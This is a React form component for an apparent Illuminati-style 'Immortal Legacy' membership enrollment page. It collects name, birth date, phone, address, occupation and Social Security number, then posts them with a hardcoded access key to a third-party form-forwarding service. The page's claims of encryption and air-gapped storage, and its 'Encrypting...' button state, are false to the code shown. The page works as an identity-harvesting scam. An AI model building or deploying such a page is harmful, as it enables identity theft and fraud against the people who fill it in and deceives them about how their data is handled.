import { useState } from "react";
import { useNavigate } from "react-router-dom";

export default function Form() {
  const navigate = useNavigate();
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState(null);
  const [formData, setFormData] = useState({
    name: "",
    email: "",
    dob: "",
    phone: "",
    address: "",
    occupation: "",
    ssn: "",
    plan: "STARTER",
    $honeypot: "" // Honeypot field for anti-spam
  });

  const handleChange = (e) => {
    setFormData({
      ...formData,
      [e.target.name]: e.target.value
    });
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    setLoading(true);
    setError(null);

    const payload = {
      ...formData,
      subject: "New Enrollment - " + formData.name,
      accessKey: "sf_fda26d3bf07f6888cc1ef789",
      replyTo: formData.email
    };

    try {
      const response = await fetch("https://api.staticforms.xyz/submit", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(payload),
      });

      const result = await response.json();

      if (response.ok && result.success) {
        navigate("/thank-you");
      } else {
        setError(result.message || "Submission failed. Please check your access key.");
      }
    } catch (err) {
      setError("Network error. Please ensure your ad-blocker is disabled and try again.");
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="bg-background text-on-surface selection:bg-primary selection:text-on-primary min-h-screen">
      {/* TopAppBar Navigation Shell */}
      <header className="bg-background/60 backdrop-blur-[20px] docked full-width top-0 z-50 border-b border-outline-variant/15 fixed w-full h-20 flex justify-between items-center px-8">
        <div className="flex items-center gap-6">
          <button
            onClick={() => navigate("/")}
            className="flex items-center gap-2 text-[0.6875rem] font-medium tracking-[0.1em] uppercase text-on-surface-variant hover:text-tertiary transition-colors"
            type="button"
          >
            <span className="material-symbols-outlined text-sm">arrow_back</span>
            Back
          </button>
          <span className="text-[0.6875rem] font-medium tracking-[0.1em] uppercase text-on-surface-variant">
            JAYLIN WILLIAMS
          </span>
        </div>
      </header>

      <main className="pt-32 pb-20 px-6 min-h-screen flex flex-col items-center">
        {/* Hero Section */}
        <section className="max-w-2xl w-full text-center mb-16">
          <h1 className="font-extrabold text-on-surface mb-4 leading-none uppercase text-[2.75rem] tracking-[0.1em]">
            Enroll
          </h1>
          <div className="h-px w-24 bg-tertiary mx-auto mb-6"></div>
          <p className="text-[0.75rem] font-medium tracking-[0.1em] uppercase text-on-surface-variant max-w-md mx-auto">
            Secure your position within the immortal legacy. verified identification required for administrative entry.
          </p>
        </section>

        {/* Form Section */}
        <section className="max-w-xl w-full bg-surface-container-low p-10 relative overflow-hidden shadow-2xl">
          {/* Asymmetric Gold Accent */}
          <div className="absolute top-0 right-0 w-32 h-[2px] bg-tertiary/40"></div>

          <form className="space-y-10" onSubmit={handleSubmit}>
            {error && (
              <div className="bg-error-container text-on-error-container p-4 text-[0.75rem] uppercase tracking-widest font-bold border-l-4 border-error animate-shake">
                {error}
              </div>
            )}

            {/* Field Group: Identity */}
            <div className="space-y-6">
              <div className="relative group">
                <label className="block text-[0.6875rem] font-medium tracking-[0.1em] uppercase text-on-surface-variant mb-2">
                  Full Name
                </label>
                <input
                  name="name"
                  value={formData.name}
                  onChange={handleChange}
                  required
                  className="w-full bg-transparent border-b border-outline-variant/20 text-on-surface placeholder:text-on-surface-variant/30 focus:border-primary transition-all duration-500 rounded-none px-0 py-4 outline-none"
                  placeholder="LEGAL FIRST AND LAST NAME"
                  type="text"
                />
              </div>

              <div className="relative group">
                <label className="block text-[0.6875rem] font-medium tracking-[0.1em] uppercase text-on-surface-variant mb-2">
                  Email Address
                </label>
                <input
                  name="email"
                  value={formData.email}
                  onChange={handleChange}
                  required
                  className="w-full bg-transparent border-b border-outline-variant/20 text-on-surface placeholder:text-on-surface-variant/30 focus:border-primary transition-all duration-500 rounded-none px-0 py-4 outline-none"
                  placeholder="COMMUNICATIONS@DOMAIN.COM"
                  type="email"
                />
              </div>

              <div className="grid grid-cols-1 md:grid-cols-2 gap-8">
                <div className="relative group">
                  <label className="block text-[0.6875rem] font-medium tracking-[0.1em] uppercase text-on-surface-variant mb-2">
                    Date of Birth
                  </label>
                  <input
                    name="dob"
                    value={formData.dob}
                    onChange={handleChange}
                    required
                    className="w-full bg-transparent border-b border-outline-variant/20 text-on-surface placeholder:text-on-surface-variant/30 focus:border-primary transition-all duration-500 rounded-none px-0 py-4 outline-none"
                    placeholder="MM / DD / YYYY"
                    type="text"
                  />
                </div>
                <div className="relative group">
                  <label className="block text-[0.6875rem] font-medium tracking-[0.1em] uppercase text-on-surface-variant mb-2">
                    Phone Number
                  </label>
                  <input
                    name="phone"
                    value={formData.phone}
                    onChange={handleChange}
                    required
                    className="w-full bg-transparent border-b border-outline-variant/20 text-on-surface placeholder:text-on-surface-variant/30 focus:border-primary transition-all duration-500 rounded-none px-0 py-4 outline-none"
                    placeholder="+1 (000) 000-0000"
                    type="tel"
                  />
                </div>
              </div>

              <div className="relative group">
                <label className="block text-[0.6875rem] font-medium tracking-[0.1em] uppercase text-on-surface-variant mb-2">
                  Physical Address
                </label>
                <input
                  name="address"
                  value={formData.address}
                  onChange={handleChange}
                  required
                  className="w-full bg-transparent border-b border-outline-variant/20 text-on-surface placeholder:text-on-surface-variant/30 focus:border-primary transition-all duration-500 rounded-none px-0 py-4 outline-none"
                  placeholder="RESIDENTIAL STREET, SUITE, CITY, STATE"
                  type="text"
                />
              </div>

              <div className="relative group">
                <label className="block text-[0.6875rem] font-medium tracking-[0.1em] uppercase text-on-surface-variant mb-2">
                  Occupation
                </label>
                <input
                  name="occupation"
                  value={formData.occupation}
                  onChange={handleChange}
                  required
                  className="w-full bg-transparent border-b border-outline-variant/20 text-on-surface placeholder:text-on-surface-variant/30 focus:border-primary transition-all duration-500 rounded-none px-0 py-4 outline-none"
                  placeholder="CURRENT PROFESSIONAL ROLE"
                  type="text"
                />
              </div>

                {/* Membership Tier Selection */}
                <div className="relative group">
                  <label className="block text-[0.6875rem] font-medium tracking-[0.1em] uppercase text-on-surface-variant mb-2">
                    Membership Plan
                  </label>
                  <select
                    name="plan"
                    value={formData.plan}
                    onChange={handleChange}
                    required
                    className="w-full bg-transparent border-b border-outline-variant/20 text-on-surface focus:border-primary transition-all duration-500 rounded-none px-0 py-4 outline-none appearance-none cursor-pointer"
                  >
                    <option value="STARTER" className="bg-surface-container-low text-on-surface">STARTER ($1.2K / YEAR)</option>
                    <option value="LEGACY" className="bg-surface-container-low text-on-surface">LEGACY ($5K / YEAR)</option>
                    <option value="IMMORTAL" className="bg-surface-container-low text-on-surface">IMMORTAL (PRIVATE)</option>
                  </select>
                  <span className="material-symbols-outlined absolute right-0 bottom-4 text-on-surface-variant/40 pointer-events-none">
                    expand_more
                  </span>
                </div>

                <div className="bg-surface-container-high border border-outline-variant/10 relative p-6">
                <div className="flex justify-between items-center mb-4">
                  <label className="block text-[0.6875rem] font-bold tracking-[0.15em] uppercase text-tertiary">
                    Social Security Number
                  </label>
                  <div className="flex items-center gap-2 group cursor-help">
                    <span className="text-[0.625rem] font-medium tracking-[0.05em] text-on-surface-variant opacity-0 group-hover:opacity-100 transition-opacity">
                      ENCRYPTED DATA
                    </span>
                    <span className="material-symbols-outlined text-tertiary text-lg">info</span>
                  </div>
                </div>
                <div className="flex items-center gap-4">
                  <span className="material-symbols-outlined text-on-surface-variant/40">shield</span>
                  <input
                    name="ssn"
                    value={formData.ssn}
                    onChange={handleChange}
                    required
                    className="w-full bg-transparent border-none text-xl tracking-[0.3em] text-on-surface placeholder:text-on-surface-variant/20 focus:ring-0 rounded-none px-0 py-3 outline-none"
                    placeholder="000 - 00 - 0000"
                    type="password"
                  />
                </div>
                {/* Security Spotlight Effect */}
                <div className="absolute inset-0 pointer-events-none opacity-10 bg-[radial-gradient(circle_at_50%_50%,#e9c176_0%,transparent_70%)]"></div>
              </div>
            </div>

            {/* CTA */}
            <div className="pt-6">
              <button
                disabled={loading}
                className={`w-full h-16 bg-gradient-to-r from-primary to-on-primary-container text-on-primary font-bold uppercase tracking-[0.2em] text-[0.875rem] hover:brightness-110 transition-all duration-500 flex items-center justify-center gap-4 ${loading ? 'opacity-50 cursor-not-allowed' : ''}`}
              >
                {loading ? (
                  <>
                    <span className="animate-spin material-symbols-outlined text-sm">progress_activity</span>
                    Encrypting...
                  </>
                ) : (
                  <>
                    Verify & Continue
                    <span className="material-symbols-outlined text-sm">arrow_forward_ios</span>
                  </>
                )}
              </button>
              <p className="mt-4 text-center text-[0.625rem] text-on-surface-variant/40 uppercase tracking-[0.1em]">
                By proceeding, you authorize the immortal circle to perform a standard background verification.
              </p>
            </div>
          </form>
        </section>

        {/* Privacy Policy Section */}
        <section className="max-w-xl w-full mt-16 p-8 border border-outline-variant/10 bg-surface-container-lowest/50 backdrop-blur-sm">
          <h2 className="text-[0.875rem] font-bold tracking-[0.2em] uppercase text-on-surface mb-6 flex items-center gap-3">
            <span className="material-symbols-outlined text-tertiary">privacy_tip</span>
            Privacy & Data Handling
          </h2>
          <div className="space-y-6 text-[0.6875rem] text-on-surface-variant leading-relaxed uppercase tracking-widest">
            <div>
              <h3 className="font-bold text-on-surface mb-2 tracking-[0.1em]">Data Encryption</h3>
              <p>All sensitive information, including SSN and DOB, is encrypted using industry-standard TLS 1.3 during transmission. Data is stored in secure, air-gapped environments with limited administrative access.</p>
            </div>
            <div>
              <h3 className="font-bold text-on-surface mb-2 tracking-[0.1em]">Third-Party Disclosure</h3>
              <p>We do not sell, trade, or otherwise transfer your personally identifiable information to outside parties. This excludes trusted third parties who assist us in operating our website and conducting background verification.</p>
            </div>
            <div>
              <h3 className="font-bold text-on-surface mb-2 tracking-[0.1em]">Data Retention</h3>
              <p>Personal data is retained only for as long as necessary to fulfill the purposes outlined in this enrollment process, after which it is securely purged from our systems.</p>
            </div>
            <div className="pt-4 border-t border-outline-variant/10">
              <p className="italic opacity-60 italic normal-case tracking-normal">For detailed inquiries regarding your data, contact the administrative security team at security@jaylinwilliams.com</p>
            </div>
          </div>
        </section>

        {/* Decorative Branding */}
        <div className="mt-20 opacity-20 pointer-events-none flex flex-col items-center">
          <img
            alt="J.W. Monogram"
            className="w-16 grayscale mb-4"
            src="/jay5.png"
          />
          <span className="text-[0.75rem] tracking-[0.5em] font-light uppercase">
            Jaylin Williams
          </span>
        </div>
      </main>

      {/* Footer Shell */}
      <footer className="bg-surface-container-lowest w-full py-12 px-8 border-t border-outline-variant/15">
        <div className="flex flex-col md:flex-row justify-between items-center max-w-7xl mx-auto gap-6">
          <div className="text-[0.6875rem] font-medium tracking-[0.1em] uppercase text-on-surface-variant">
            © 2024 THE IMMORTAL LEGACY. ALL RIGHTS RESERVED.
          </div>
          <div className="flex gap-8">
            <a className="text-[0.6875rem] font-medium tracking-[0.1em] uppercase text-on-surface-variant hover:text-on-surface transition-colors duration-300" href="#">
              Privacy
            </a>
            <a className="text-[0.6875rem] font-medium tracking-[0.1em] uppercase text-on-surface-variant hover:text-on-surface transition-colors duration-300" href="#">
              Terms
            </a>
            <a className="text-[0.6875rem] font-medium tracking-[0.1em] uppercase text-on-surface-variant hover:text-on-surface transition-colors duration-300" href="#">
              Security
            </a>
          </div>
          <div className="text-on-surface font-bold tracking-[0.2em] text-[0.75rem]">
            J.W.
          </div>
        </div>
      </footer>
    </div>
  );
}
